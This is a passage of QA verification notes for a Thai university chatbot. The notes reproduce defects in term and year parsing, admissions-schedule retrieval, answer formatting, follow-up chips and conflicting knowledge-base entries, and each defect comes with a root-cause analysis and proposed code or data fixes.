confirmed.fix: Data/content fix, no code logic change. (a) Rewrite the offending sentences in the source of submissions/ui/knowledge-index.json (find the generator or source .md by rg for an ID such as gm_thesis_submission_05_committee_names) as student advice. For example, replace 'ระบบ AI ตรวจคำสั่งส่วนตัวไม่ได้' with 'ถ้าเปลี่ยนกรรมการ ให้ถามหลักสูตรหรือเจ้าหน้าที่ที่ตรวจคำสั่งจริง'. (b) Extend the existing voice-lint test (tests/voice_lint.test.mjs; confirm its scope) to scan the `answer` of every entry in knowledge-index.json for /ห้าม|อย่า(?!ง)|ไม่สรุป|ไม่ตีความ|ระบบ AI|แชทนี้|ก่อนตอบ|ตามกรอบแดง|ยังรอ.*รับรอง/ with an allowlist for intentional cases. (c) Correct the status line in docs/kb-wording-requests.md line 3 to say which entries were done and which remain.
notes: Reproduced two ways. (1) Regex scan of submissions/ui/knowledge-index.json (132 entries): 29 entries have meta/bot-directed phrases in `answer` using a narrower regex than the report's (ห้าม, อย่า, ไม่สรุป, ไม่ตีความ, ระบบ AI, แชทนี้, ก่อนตอบ, ต้องถามว่า, ตามกรอบแดง, AI เข้าถึง). The report's ~35 is plausible with the wider marker list. confirmed.title: Thai term/year shorthand is not understood by the registration scope guard
confirmed.repro: Fresh page: ลงทะเบียนเรียนเทอมแรกปี 69 เมื่อไหร่ค่ะ | ซัมเมอร์ปี 69 ลงทะเบียนเมื่อไหร่คะ | เทอมสองปี 70 ลงทะเบียนเมื่อไหร่ | ลงทะเบียนเทอม 1/2569 | ลงทะเบียนเทอม 1 ปี 2570 | ลงทะเบียนซัมเมอร์ | ลงทะเบียนเมื่อไหร่ | ลงทะเบียนภาคต้น 2569 และ 2570 ต่างกันยังไง.
confirmed.expected: The typed term and year are used (1/2569 = ภาคต้น 2569; ซัมเมอร์ = ฤดูร้อน; ปี 69 = 2569); missing parts get an ask listing all matching schedules; a comparison mentions both years.
confirmed.actual: The first three are declined entirely (all 12 colloq2/typo variants of the six schedule entries fail). 'เทอม 1/2569', 'เทอมแรก 2569', 'ภาค 1 2569', 'เทอมสอง', 'เทอมปลาย', 'เทอมต้น', 'ซัมเมอร์ 2569' re-ask the semester just given. 'เทอม 1 ปี 2570' lists first, second and summer. 'ลงทะเบียนซัมเมอร์' offers no summer option. 'ลงทะเบียนเมื่อไหร่' offers only 3 of 6 schedules. The comparison silently answers 2569 first term only.
confirmed.fix:
1. Add a small normaliser, e.g. normTermYear(s), applied in _askCore right after normChat and before KB ranking, but only when the text contains ลงทะเบียน, กำหนดการ or a scoped category. Rewrites:
   - /เทอม(?:แรก|ต้น| ?1)\b|ภาค ?1(?!\d)|term ?1/ -> ภาคต้น
   - /เทอม(?:สอง|ปลาย| ?2)|ภาค ?2(?!\d)/ -> ภาคปลาย
   - /ซัมเมอร์|summer|เทอมร้อน|ภาค ?3/ -> ฤดูร้อน
   - /\b([12])\/(\d{2,4})\b/ -> "ภาคต้น|ภาคปลาย ปี <year>"
   - 2-digit BE years: /ปี ?(6\d|7\d|8[0-8])(?!\d)/ -> ปี 25NN
   The same expansion is needed in scopeOf() (extend _TERMS and the year regex), so both the ranking and the guard see it.
2. In scopeClarify's ask(), build candidates from every entry in `same` (all dated entries of that category and shape, up to 6) filtered by the already-given year or term, instead of only the near-top by score. That makes "ลงทะเบียนเมื่อไหร่" and "ลงทะเบียนซัมเมอร์" list all matching schedules.
3. When the question contains two distinct years (or "และ"/"กับ"/"ต่างกัน" with two years), skip the pick and return an 'ask' or multi-entry answer that shows both years, rather than collapsing to the first year.
4. Mirror all of this in the Rust/wasm twin and extend tests/kb_scope.test.mjs with the eight repro questions.
notes:
I reproduced F14 in my own headless Chrome (port 9726), with a fresh page per question and the waits from the existing scripts. The results were identical under ?engine=rust and ?engine=js. The harness is /tmp/qa/verify/F14-0/run.mjs. The root cause is partly different from the report.

Results:
- Declined with the generic not-found ("ขออภัยครับ ผมยังจับใจความคำถามนี้ไม่ได้", chips เรียนไรดี / ค่าเทอม... / ส่งรูปเล่ม...): "ลงทะเบียนเรียนเทอมแรกปี 69 เมื่อไหร่ค่ะ", "ซัมเมอร์ปี 69 ลงทะเบียนเมื่อไหร่คะ", "เทอมสองปี 70 ลงทะเบียนเมื่อไหร่". Run on both engines: 3/3 rust, 1/1 js (only the first was run on js).
- "ลงทะเบียนเทอม 1/2569" and "ลงทะเบียนเทอมแรก 2569" got "คำตอบไม่เหมือนกันในแต่ละภาคเรียน — หมายถึงอันไหน?". The chips were the three 2569 schedules, so the already-given term was ignored.
- "ลงทะเบียนซัมเมอร์ 2569" gave the same term re-ask with all three 2569 chips.
- "ลงทะเบียนเทอม 1 ปี 2570" re-asked the term and listed first, second and summer 2570. The year was used but the term was ignored.
- "ลงทะเบียนซัมเมอร์" and "ลงทะเบียนเมื่อไหร่" both gave the disambiguate message "คุณอาจหมายถึง (คิดซ้ำแล้วมีหลายข้อใกล้กัน)" with chips ภาคต้น 2570, ภาคปลาย 2570 and ภาคปลาย 2569. There was no summer option and only 3 of the 6 schedules.
- "ลงทะเบียนภาคต้น 2569 และ 2570 ต่างกันยังไง" answered only the ภาคต้น 2569 entry ("ที่มา: การลงทะเบียนและกำหนดการศึกษา ภาคต้น ปีการศึกษา 2569"). The 2570 chip appears only as a follow-up.
- Control: "ลงทะเบียนภาคต้น 2569 เมื่อไหร่" answers correctly, and "ลงทะเบียนเรียนภาคต้นปี 69" re-asks the year, so 2-digit BE years are not parsed either.

Root cause, from reading chatbot.html:
1. scopeOf() (line ~729) has _TERMS regexes only for ภาคต้น, ภาคเรียนที่ 1, first semester, semester 1, ภาคปลาย, ฤดูร้อน and summer. It does not know เทอม, เทอมแรก, เทอมสอง, ซัมเมอร์, ภาค 1, "1/2569" or "2/70". Its year regex needs exactly 4 digits (2567-2588 or 2024-2045), so "ปี 69" and "ปี 70" give no year.
2. The "declined entirely" cases fail before scopeClarify. KB retrieval gives top.s below 4 because the words เทอมแรก, เทอมสอง and ซัมเมอร์ do not match the entries' ภาคต้น, ภาคปลาย and ฤดูร้อน. decideTier then escalates, and with no AI the answer is the not-found. A scopeOf-only fix would not cure these three; the query must be normalised before ranking.
3. The ask() candidate list comes from same = ranked entries with s >= top.s-1, so it lists only the near-top entries, hence 3 of 6. The comparison question has year 2569 and a term, so scopeClarify picks one hit and never considers 2570.

Severity: medium. This is not a wrong fact. The bot declines honestly or asks, never invents, so the design rules are not violated. But colloquial Thai ("เทอมแรก", "ซัมเมอร์", "ปี 69") is very common for the registration-dates question, and the behaviour is worse than the typed-formal path, with a pointless re-ask loop. The two-year comparison silently dropping 2570 is the only one that gives a partial answer without saying so, and that is the strongest sub-issue. Not intended design.

Caveat: this is the same code in both engines. If the Rust/wasm twin duplicates scopeOf, it needs the same change. tests/kb_scope.test.mjs covers this area.

Reproduced on two independent runs (rust and js), fresh Chrome on port 9727, with the same result every time (deterministic code path, no AI). This is not a timing or carry-over artefact.

It is not design intent. The rules say unknown questions get an honest not-found. That holds here, because the three declined questions give a hand-off and no wrong facts. But the questions are ordinary Thai shorthand for terms that exist in the manual. The comparison case is worse: it silently answers one year for a two-year question, a mild incomplete-answer risk.

I kept medium. No fabricated facts are given, but it is a dead end or a mis-scope on very common phrasing.

The reporter's "all 12 colloq2/typo variants fail" was not tested by me. I checked only the 10 listed questions and a few controls.

confirmed.title: Admissions schedule questions miss gm_schedule_2570_round1 or mix it with the registration schedule
confirmed.repro: Fresh page: สมัครเรียนปี 2570 เมื่อไหร่ | สมัครเรียนปี 2569 เมื่อไหร่ | รับสมัครปี 70 รอบแรกวันไหนคะ | สมัครภาคต้น 2570 รอบ 1 เมื่อไหร่ครับ | รับสมัครรอบ 2 ปี 2570 | เปิดรับสมัครวันไหน ปิดวันไหนครับ | registration schedule first semester 2569.
confirmed.expected: gm_schedule_2570_round1 for the first four; honest 'manual only has round 1' for round 2; registration schedule or hand-off for the English question.
confirmed.actual: The first three show 'ผมยังไม่แน่ใจว่าหมายถึงหลักสูตรไหน' plus a programme list; the fourth shows the registration schedule; round 2 shows sample announcement 2018DG00 as if general; the sixth asks among admission_schedule, programmes, availability; the English one shows the admissions entry.
confirmed.fix:
Smallest fix, in two parts.

(a) Data, in submissions/ui/knowledge-index.json, entry gm_schedule_2570_round1. Add to its "keywords" the terms: สมัครเรียน, เปิดรับสมัคร, ปิดรับสมัคร, เมื่อไหร่, วันไหน, รอบแรก, รอบที่ 1, ปี 70. This should lift search() scores for questions 1–3 and 6 above the threshold, so decideTier returns act. Question 6 may also need a tie-break against the generic admissions entry "กำหนดการเปิด-ปิดรับสมัครเมื่อไร". Check that this does not break the existing benchmark of 44/52 correct answers.

(b) Code, in chatbot.html.
- In scopeOf(), add a round field (รอบ ?(\d)|รอบแรก) and make scopeClarify() return a new kind 'no_round'. It should fire when the question names a round and the top hit is a schedule whose title carries a different round or the sample 2018DG00 entry.
- That reuses the existing 'no_year' honest-not-found path: "the manual only has round 1, see the official page".
- In the not-found branch near line 1673, test an admissions-schedule regex (/(?:สมัคร|รับสมัคร).*(?:เมื่อไหร่|วันไหน|กำหนด|รอบ)/) before hasStudyIntent. Route to the nearest KB admissions entry (or a hand-off), not renderFinder with VOICE.unsureProgramme.
- Keep the registration/admissions split in scopeClarify() by allowing 'same' to match by the สมัคร vs ลงทะเบียน family, not only by category. Question 5 shows the reverse leak.

Mirror any change to the pure logic in the Rust/wasm twin, since ?engine=rust is the default.
notes:
Reproduced all 7 questions, deterministically, in fresh headless Chrome (port 9728, dead api/llm URLs). I ran each on a fresh page in both ?engine=rust and ?engine=js, with identical results, so it is not a timing or carry-over artefact. The script is /tmp/qa/verify/F15-0/run.mjs, with output in rust.txt.

Actual results, quoted:
1. "สมัครเรียนปี 2570 เมื่อไหร่", "สมัครเรียนปี 2569 เมื่อไหร่" and "รับสมัครปี 70 รอบแรกวันไหนคะ" all give the same "ข้อมูลทางการ ผมยังไม่แน่ใจว่าหมายถึงหลักสูตรไหนครับ (จดคำถามไว้ให้ทีมคู่มือแล้ว) ... พบ 379 หลักสูตร ... 1) อยากเรียนระดับไหน". That is the programme finder, with no schedule and no 'not in the manual' wording.
2. "สมัครภาคต้น 2570 รอบ 1 เมื่อไหร่ครับ" gives "ลงทะเบียนปกติ ภาคต้น 2570 ... ช่วงลงทะเบียนปกติ: 5–12 กรกฎาคม 2570". That is the registration schedule, not the admissions round 1. The right entry appears only as a follow-up chip, "กำหนดการรับสมัครปีการศึกษา 2570 ภาคต้น รอบ 1".
3. "รับสมัครรอบ 2 ปี 2570" shows "ตัวอย่างประกาศรับสมัคร 2018DG00 ปีการศึกษา 2570 ... เป็นตัวอย่างที่สำรวจหนึ่งหลักสูตร ไม่ใช่เกณฑ์กลาง". It is a single-programme sample with no statement that the manual only has round 1.
4. "เปิดรับสมัครวันไหน ปิดวันไหนครับ" gives "คุณอาจหมายถึง ..." with three chips: กำหนดการเปิด-ปิดรับสมัครเมื่อไร / มีสาขาวิชาอะไรเปิดรับสมัครบ้าง / การตรวจว่าหลักสูตรใดกำลังเปิดรับสมัคร. The chips do not include gm_schedule_2570_round1.
5. "registration schedule first semester 2569" gives the generic 'กำหนดการรับสมัครแตกต่างกันตามปีการศึกษาและรอบ ... ที่มา: กำหนดการเปิด-ปิดรับสมัครเมื่อไร'. That is an admissions entry returned for a registration question, with no hand-off wording.

Refinement:
- The data is present. gm_schedule_2570_round1 exists in knowledge-index.json (around line 544, academic_year 2570, semester ภาคต้น). Its keywords contain "รับสมัคร" and "สมัคร" but not "สมัครเรียน", "เมื่อไหร่", "วันไหน" or "เปิดรับสมัคร".
- Variants that include the word "รับสมัคร" work. "กำหนดการรับสมัคร 2570 รอบ 1" and "รับสมัครปี 2570 เมื่อไหร่" both return gm_schedule_2570_round1 correctly.
- So the miss depends on wording. "สมัครเรียน/สมัครภาคต้น … เมื่อไหร่" scores too low in search(), and "ปี 2570 เปิดรับสมัครเมื่อไหร่" lands on the generic admissions entry.
- "รับสมัครรอบ 2 ปี 2569" also shows the 2018DG00 sample for 2569, because the sample's year is not checked.

Root cause: no code path routes admissions-schedule wording to the entry, and there is no round awareness.
1. Questions 1–3 get a KB search score below 3. In _askCore, decideTier returns 'escalate', so the question falls to the not-found branch (around line 1673), where hasStudyIntent(q) matches "สมัคร" and renderFinder is called with VOICE.unsureProgramme. That is where the "ไม่แน่ใจว่าหมายถึงหลักสูตรไหน" text comes from. The programme resolver itself returns nothing.
2. In question 4, "ภาคต้น" pulls the top hit to the registration-schedule entry. scopeClarify() only picks within the same category as the top hit, so the admissions entry is never considered.
3. The round number ("รอบ 2") has no field in scopeOf(), so a question about round 2 is answered with whatever scores highest.

Design-rule check: this is not intended. The manual does have round 1, and the honest-not-found rule is broken in cases 1–3 by showing programme-finder text, and in case 3 by presenting a single-programme sample as if general.

Severity: medium is right. The answers are not fabricated and each carries a hand-off or chip. But these are very common applicant questions and the page gives a wrong or confusing first answer.

Reproduced all 7 questions, deterministically. I used a fresh page per question and waited for programmes.json to load. I ran them with ?engine=rust (the default) and ?engine=js, and the results were identical, so the cause is not in the wasm/JS split. Script: /tmp/qa/verify/F15-1/run.mjs.

Actual output, quoted:

gm_schedule_2570_round1 appeared in none of the seven. It is in knowledge-index.json, approved, with academic_year 2570 and semester ภาคต้น.

Mechanism, from reading _askCore() in chatbot.html:
- Q1 to Q3 find no KB hit strong enough. They fall to the not-found branch, where hasStudyIntent(q) is true because the query contains สมัคร. renderFinder(..., VOICE.unsureProgramme) then runs. The programme resolver and the finder are not at fault. The cause is that search() ranks gm_schedule_2570_round1 too low for colloquial phrasings. Its keywords are formal ("กำหนดการรับสมัครปีการศึกษา 2570 ภาคต้น รอบ 1 admission schedule round 1 2570 2027 สมัคร ...") and lack สมัครเรียน, เมื่อไหร่, วันไหน, ปี 70, รอบแรก, and เปิด/ปิดรับสมัคร.
- Q4 matches the registration entry because both entries share "ภาคต้น 2570". The query's สมัคร is not weighted against ลงทะเบียน.
- For the 2569 variant, scopeClarify() would give an honest no_year answer ("manual has only 2570"). It is never reached, because the KB tier does not return act for that query.
- Round 2 falls to the sample 2018DG00 entry because it matches "2570" and "รับสมัคร".

My suggested fix is untested; I did not apply it (the repo is read-only for this task).

Severity: medium is right. The answers are wrong or evasive, not made up, so the no-improvisation rule holds. Q4 is the worst because it shows the registration dates as the application dates. Admissions dates are a high-traffic question. This is not intended design: the manual has the entry and the bot fails to retrieve it. The honest hand-off for round 2 is correct in spirit but is not what happens.

Two corrections to the report: the sixth question's chips do not include gm_schedule_2570_round1, and the English question does not hit "the admissions entry for the registration schedule" in any useful way. It returns the generic admission_schedule entry.

- ประกัน did not get the unsure message. It got "พบ 2 หลักสูตรที่ตรงกับที่ถาม" with cyber-security and information-assurance programmes, a substring match.
- ตารางเรียน got "เรื่อง "ตาราง" ในคู่มือมีหัวข้อนี้" with only the Shuttle Bus schedule chip.
- ค่าเทอมจ่ายไม่ทัน มีวิธีผ่อนไหม got the generic "ค่าเทอมต่างกันตามหลักสูตร..." finder. That is the fee-topic finder, not the unsure message, and it does not address instalments.

Root cause, after reading _askCore: the finding's framing is partly off. The resolver does not pre-empt the KB. The KB search runs first and finds nothing for these phrasings, so the question reaches the not-found branch at chatbot.html ~line 1673-1675. That branch calls logGap(q), then `nearP = resolveProgramme(q, PROG, true)`. If `hasStudyIntent(q) || nearP`, it calls renderFinder(... VOICE.unsureProgramme ...) and returns. The honest not-found with options and staff hand-off is never reached.

Two over-broad gates cause the wrong output:
1. hasStudyIntent (line 1054) fires on bare substrings such as เรียน and สมัคร (สมัคร(?!สอบ)). That catches พักเรียน, ใบแสดงผลการเรียน, ฝ่ายรับสมัคร, เสาร์อาทิตย์ with เรียน, and "GRID ... นั่งเรียน". The _P_TOPIC/_P_OTHER exclusions do not cover leave, transcript, contacts or calendar.
2. resolveProgramme(q, PROG, true) in fuzzy "near" mode returns the closest programme names for any noun, so โรงอาหาร goes to โภชนาการ and ฝึกงาน goes to อาชญาวิทยา. With `|| nearP` that is enough to trigger the finder.

Two secondary defects:
- The wording "จดคำถามไว้ให้ทีมคู่มือแล้ว" is shown even though the question is not a programme question.
- The KB entries exist (leave_of_absence, extend_study_leave, gm_admissions_office_contacts, transcript_general, contact_line, admission_last_term, gm_registration_graduation), but retrieval misses these colloquial phrasings. Part of this is a retrieval and alias gap, not only a fallback problem.

Severity medium is right. There is no wrong fact and no fabricated answer, but the student gets an irrelevant programme list instead of the honest not-found and hand-off. That is a design-rule violation in spirit, and common questions are affected. I did not independently verify the "21 of 792 variants" figure.

confirmed.fix:
All in submissions/ui/chatbot.html, with the same changes mirrored in the Rust answer_points and slot_lead (the wasm twin).
1. answerPoints: after splitting, merge a point ending in ':' or '：' with the next point (join with a space). Merge any point with fewer than about 4 characters, or only a bare word such as ส่วน/หน้า/FAQ, into the following point. Mark points starting with '▪' as headers (keep a flag) and strip the '▪ n.' prefix.
2. _SPLIT_BEFORE: drop ส่วน, หน้า and FAQ from the lookahead, or require the previous character to be a sentence end. A simple fix is to remove 'ส่วน|FAQ' and rely on _sentences, and collapse adjacent splits.
3. kbBody: choose the first point as the first non-header point. Render headers as a sub-heading line instead of '• ▪'. Count the fold by logical groups (header plus its items) so the first date group is not cut mid-label. For deadline questions (วันสุดท้าย, วันไหน, เมื่อไร), put the first line containing a date (a month name or a year) first.
4. slotLead: keep the money slot from firing on a fine when the question says 'วันสุดท้าย', and skip when the body has more than one distinct figure (show all tiers or none). Add 'นานเท่าไร|นานไหม|ใช้เวลา' to the duration ask regex.
5. Duration lead: change to `${/ไม่เกิน|ภายใน/.test(m)?'':'ภายใน '}${m}` (add a space).

Root causes, found in /Users/ozone/projects/ReflexWork/submissions/ui/chatbot.html:
- _SPLIT_BEFORE (line 674) includes ส่วน and FAQ. Text such as 'ส่วน FAQ ...' and 'ส่วน' before 'FAQ' splits twice, leaving 'ส่วน' alone. 'หน้า' alone comes from the sentence splitter or a leading 'หน้า' line before the 'FAQ' split.

It reproduces every time, since it is deterministic and the AI is not involved.

Quoted actual text:
- 'ลงทะเบียนภาคต้น 2569 วันไหน' opens with '▪ 1. การลงทะเบียนปกติ ภาคต้น ปีการศึกษา 2569 (หน้า 1)'. Next come the bullets '• ช่วงลงทะเบียนเรียนปกติ:', '• 13–20 กรกฎาคม 2569' and '• วันสุดท้ายของการชำระค่าธรรมเนียมสำหรับการลงทะเบียนปกติ:' (label with no value), then 'อ่านเพิ่มอีก 30 ข้อ'. The 30 กรกฎาคม 2569 deadline sits in the fold. No bold lead is shown.
- 'วันสุดท้ายชำระค่าธรรมเนียม ภาคปลาย 2569' gets a bold lead '2,000 บาท' (the late fine), not the 31 ธันวาคม 2569 deadline. The lead sits above '▪ ลงทะเบียนปกติ…' and the bullets, and the date appears only as the third bullet.
- GRID: bold '4,000 บาท', then 'GRID 530/…: หน่วยกิตละ 4,000 บาท…'. The other tiers (1,800 and 8,000 baht) are there, but the lead shows only the first.
- 'ตรวจรูปเล่มใช้เวลานานเท่าไร': no bold lead. The first line is a long 'FAQ ของงานบริการการศึกษา… ภายใน 5 วันทำการ…มาจาก', and the next bullet starts '• FAQ และยังรอหน่วยงานรับรอง' (the sentence is cut right after 'มาจาก').
- Abstract: bold 'ภายใน3 วันทำการ' (missing space).
- Signature and PDF-file: a lone '• ส่วน' bullet, and a bullet ending 'ข้อจำกัด 25 MB เป็นข้อมูลจาก' followed by '• FAQ ไม่ใช่ตัวเลข…'.
- Soft Skills: the first line is just 'หน้า', followed by '• FAQ ระบุว่า…'.

I did not separately reproduce the '• ▪' double markers (they are inside the fold) or the claim that 17 bullets start with FAQ. Both follow from the same mechanism in answerPoints.

Root causes, confirmed in code (submissions/ui/chatbot.html, with a Rust twin):
1. answerPoints splits on newlines and strips only '-', '•', '*' and '1.' markers. A leading '▪' is not stripped, so the entry's section header becomes the 'first point' ('answer'). Every line inside an entry is then its own point, so a 'label:' line is separated from its value line.
2. _SPLIT_BEFORE splits on whitespace before ส่วน, FAQ and similar words anywhere in a sentence. That causes the lone 'ส่วน' bullet, 'FAQ' bullets, and 'มาจาก' / 'FAQ' fragments. 'หน้า' alone is a different cause: it is a label or sentence fragment cut by the same sentence splitter, not a split-before word. The finding lists 'หน้า' among the split-before words, but it is not one in the current regex.
3. _SLOTS and slotLead: the first match in the whole body wins. The duration slot's 'ask' does not contain 'นานเท่าไร', so that question falls through to the cost slot (there is no baht in the entry, so there is no lead). Lead formatting `ภายใน${m}` has no space because grab matches '3 วันทำการ' with no prefix. The cost slot takes the first '\d+ บาท' regardless of what was asked (fine vs. deadline, or the first of 3 tiers). The question's actual field ('วันไหน' / 'วันสุดท้าย') has no date slot at all.

Severity: medium is right. The facts are all from the manual and nothing is invented, but the first visible line is often a header or fragment, and the bold lead can show the wrong figure (the 2,000 baht fine as the answer to a deadline question). A bold wrong-looking number carries more risk than a plain formatting issue, but the correct text is still shown.

Design intent: none. 'The first point is the answer' and 'the manual's own words unchanged' are the stated design in the code comment above answerPoints, and this behaviour breaks both. Cutting a sentence in the middle does not follow from the 'only whitespace, a trailing full stop and list markers are removed' rule.

confirmed.title: 'ถามต่อ' follow-up chips fall back to fixed or near-duplicate unrelated entries
confirmed.repro: Ask the exact titles of gm_thesis_submission_13_review_time, purchase_methods, thesis_late_penalty, gm_registration_flat_refund, gm_military_deferment_directory_2570, internet_account; also 'หอพัก' and 'ส่งรูปเล่มภายในกี่วัน'; read the chips.
confirmed.expected: Three chips on the same topic, not repeating the entry just shown.
confirmed.actual: Review-time offers contact_line, scholarship_types, purchase_methods; purchase_methods offers contact_line, scholarship_types, review_time; late_penalty offers template/chapters/abstract; หอพัก offers health-announcement entries; one chip nearly identical to the shown answer. 48 of 131 answers have two or more such chips; template/chapters/abstract appear 28/25/12 times; looks like an id-order tie-break.
confirmed.fix:
Fix in submissions/ui/chatbot.html, function addFollowUps (plus its Rust/wasm twin if the ranking lives there; the chips were identical under both engines, so check). The smallest change is in two parts.

(a) Search with the shown entry's title instead of the typed text: `search(cur.title)` (fall back to `q` if `cur` is missing), and exclude near-duplicates, e.g. skip candidates whose normalised title token-overlap (Jaccard) with `shown` is >= ~0.6.

(b) Replace the unranked KB-order top-up with a ranked one. Take same-category entries, sort them by the search score against `shown`, keep only those with s>=2, and do not pad to 3. Show 0 to 2 chips if fewer qualify. The `if(!picks.length) return;` guard already handles zero.

Also strip the shared prefix 'บัณฑิตวิทยาลัย' from the similarity tokens, since it creates false matches for the review-time and purchase-methods entries.
notes:
Reproduced on a fresh page per question in my own Chrome (port 9734), under both ?engine=rust and ?engine=js, with identical chips each time. The probe script is /tmp/qa/verify/F18-0/p.mjs. It waits for a new .msg.b without .typing, then reads .followups .dis. Chip text was identical in the Rust and JS runs, so it is not an engine or timing artefact. I resolved the entry ids to titles via knowledge-index.json and ran the 6 exact titles plus 'หอพัก' and 'ส่งรูปเล่มภายในกี่วัน'.

Chips seen (shown topic first, then chips):
- Review time (บัณฑิตวิทยาลัยตรวจรูปเล่มใช้เวลานานเท่าไร): ติดต่อบัณฑิตวิทยาลัยได้ช่องทางใด / บัณฑิตวิทยาลัยมีทุนการศึกษาอะไรบ้าง / บัณฑิตวิทยาลัยจัดซื้อจัดจ้างได้กี่วิธี. These match the 'บัณฑิตวิทยาลัย' prefix, not the topic.
- Purchase methods: contact / scholarship / ตรวจรูปเล่มใช้เวลานานเท่าไร. Same pattern.
- Late penalty (คำนวณค่าปรับส่งเล่มล่าช้า): Template รูปเล่ม / ต้องมีกี่บท / บทคัดย่อไทยและ Keywords. Only the first is arguably related.
- Flat refund (เหมาจ่าย: ลดรายวิชาไม่คืนเงิน…): ฟอร์มทะเบียน ลาพัก ลาออก ขอคืนเงิน / ขอเปลี่ยนชื่อ-สกุล / เปลี่ยนแผนการศึกษารหัส 66. The first is relevant; the others are generic registrar-category fillers.
- Military deferment 2570: หอพักและบ้านมหิดล / ประกาศตรวจสุขภาพที่ยกเลิก / บริการสุขภาพและเบิกค่ารักษา. Unrelated.
- Internet Account: MU GRAD Plus score / English score before applying / application fee. Unrelated.
- 'หอพัก': three health items (health announcement, health services, mental-health counselling). Unrelated to dormitory.
- 'ส่งรูปเล่มภายในกี่วัน': the first chip is 'ต้องส่งรูปเล่มภายในกี่วัน และเริ่มส่งอย่างไร', a near-duplicate of the answer shown ('ส่งรูปเล่มวิทยานิพนธ์ภายในกี่วันหลังสอบผ่าน'). The exact-title filter only removes the identical title.

Cause (addFollowUps, chatbot.html ~L1854-1869):
1. search(q) is run on the user's typed text, not on the shown entry. For an exact title it returns the shown entry plus weak matches (r.s>=2).
2. If fewer than 3 picks remain, it tops up with `for(const e of KB) if(e.category===cur.category …)`. That is KB file order with no ranking, which matches the explorer's 'id-order tie-break'. Broad categories (the contact, thesis and general-info groups) fill with fixed entries, so the same template/chapters/abstract chips recur.
3. Dedup only compares the title string, so a paraphrase entry is never excluded.

I did not recount the 48/131 and 28/25/12 figures, since the code makes them plausible. The 8 cases above are enough to confirm the defect.

Severity: low. This is a quality and relevance problem, not a factual one. Every chip is a valid manual entry and answers honestly when clicked, and nothing is invented. It does look sloppy: the military-deferment answer is followed by dormitory and health chips. The explorer's 'medium' is generous. If kept at medium, the reason would be that it affects roughly a third of KB answers.

Not a design rule violation: facts still come only from the manual. The 'top up with the same topic area' behaviour is intended per the code comment, but the implementation is crude.

REPRODUCED 8/8 questions, deterministic, in my own headless Chrome (port 9735) with both the default Rust engine and ?engine=js, with identical chips. Fresh page per question, waited for the .msg.b bubble with no .typing plus 150 ms. Script: /tmp/qa/verify/F18-1/run.mjs. Results: /tmp/qa/verify/F18-1/six.json.

Actual chips I got (ถามต่อ):
- Review time (gm_thesis_submission_13_review_time) gives contact_line "ติดต่อบัณฑิตวิทยาลัยได้ช่องทางใด", scholarship_types "บัณฑิตวิทยาลัยมีทุนการศึกษาอะไรบ้าง", purchase_methods "บัณฑิตวิทยาลัยจัดซื้อจัดจ้างได้กี่วิธี".
- purchase_methods gives contact_line, scholarship_types, review_time.
- thesis_late_penalty gives the Template, the chapters ("ต้องมีกี่บท") and the Thai-abstract entries. These are in the same category (thesis_submission) but are KB-order filler.
- gm_registration_flat_refund gives the registration forms entry, the name-change entry and the study-plan change for students with code 66 and below. These are weakly related.
- gm_military_deferment_directory_2570 gives "หอพักและบ้านมหิดล", the cancelled health-announcement entry and the health-services entry.
- internet_account gives MU GRAD Plus scores, English-score requirement and application fee.
- "หอพัก" shows the dorm answer, then chips for the cancelled health announcement, health services and mental-health counselling. The dorm entry is not repeated, but all three chips are off-topic.
- "ส่งรูปเล่มภายในกี่วัน" shows the answer, then a chip "ต้องส่งรูปเล่มภายในกี่วัน และเริ่มส่งอย่างไร". That is a near-duplicate of the answer just shown, followed by Template and chapters.

I did not re-measure the 48/131 count or the 28/25/12 template/chapters/abstract frequencies. Both the code and the 8 cases support the pattern.

Root cause, read from the code: addFollowUps() in submissions/ui/chatbot.html (~line 1854) has two stages.
1. picks = search(q).filter(r => r.s >= 2 && r.e.title !== shown).slice(0,3). When the query is an exact title, the shared word "บัณฑิตวิทยาลัย" appears in many titles and keywords, so unrelated entries clear s >= 2. That is why the review-time and purchase chips come from different categories (general, scholarship, procurement). It is a weak-threshold match on a common word, not an id-order tie-break.
2. If fewer than 3 picks remain, it tops up with `for (e of KB) if (e.category === cur.category ...)`, which takes entries in KB file order. That explains the same Template, chapters and abstract chips recurring for thesis_submission. The reporter's "id-order tie-break" is therefore true of the fill step but not the whole story.
3. The code filters only by `title !== shown`, so a near-duplicate with a different title ("ส่งรูปเล่มภายในกี่วัน") is not excluded.

Severity: I rate it low, not medium. The chips are all real manual entries, so there is no wrong fact, no invented answer and no safety problem. It is a relevance and polish defect and the user can ignore the chips. It also isn't intended design: the design rules say nothing about follow-up chips, and the code comment says "close matches".

confirmed.title: Near-duplicate and contradictory KB entries compete (thesis_submit_days, MAP-C pair, LINE id, sign-off pickup, counts)
confirmed.repro: Ask 'ส่งเล่มกี่วัน', 'ต้องส่งเล่มภายในกี่วันหลังสอบผ่านครับ', 'แก้ที่อยู่ MAP-C', 'เปลี่ยนที่อยู่ในหนังสือรับรองผู้เรียน MAP-C', 'สนใจเข้าศึกษาต้องสมัครอย่างไร', 'ช่องทางติดต่องานรับนักศึกษา', 'ตรวจสอบการ upload หน้าเสนอและหน้าอนุมัติอย่างไร', 'ต้องส่งหน้าลงนามฉบับจริงหรือออนไลน์'.
confirmed.expected: One canonical answer per question; title and body agree; one admissions LINE id; one sign-off process.
confirmed.actual: thesis_submit_days has the 21-day title but a body about the late FINE; the full rule is only in gm_thesis_submission_10_deadline. transcript_general and suspend_general carry the same procedure (id mismatch) and steal each other's questions 8 times. Other competing pairs: thesis_citation/gm_thesis_submission_04_references, pdf/ethesis_files/upload_documents, 08_turnitin/thesis_turnitin, service_overview/student_affairs/welfare. admission_how etc. say LINE @160ohrzm while gm_admissions_office_contacts says @mugradmissions (unverifiable). thesis_check_signoff says walk in to collect the original while gm_thesis_submission_14 and thesis_signature say online-only since 17 ส.ค. 2569. 346 listings vs 379 programmes unexplained.
confirmed.fix:
Content-only fixes in submissions/ui/knowledge-index.json. No code change is needed.
1. Ask the admissions owner which LINE id is current. Then align the 3 entries carrying @160ohrzm (admission_how and 2 others) with gm_admissions_office_contacts, or footnote both.
2. Retire thesis_check_signoff, or add "ก่อน 17 ส.ค. 2569 ... / ตั้งแต่ 17 ส.ค. 2569 ตรวจสถานะในแท็บ Status และไม่ต้องรับต้นฉบับคืน". Keep gm_thesis_submission_14_signoff and thesis_signature as the canonical entries.
3. Rename suspend_general to something like map_c_general_address_2. Better, merge it into transcript_general and move its title into the keywords.
